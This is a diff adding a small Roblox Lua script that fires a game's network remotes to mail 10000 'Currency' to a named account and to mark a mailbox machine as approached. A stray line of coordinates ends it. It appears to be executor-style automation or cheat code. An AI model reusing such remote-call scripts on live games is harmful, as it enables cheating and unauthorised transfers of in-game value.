@@ -1,0 +1,16 @@
+local args = {
+	"minor_flex",
+	"Testing script.",
+	"Currency",
+	"9f49501cc1384848890fd52573e68bf8",
+	10000
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+
+
+local args = {
+	"MailboxMachine"
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Machines: Mark Approached"):FireServer(unpack(args))
+
+141.07138061523438, 23.59348487854004, -348.0879211425781
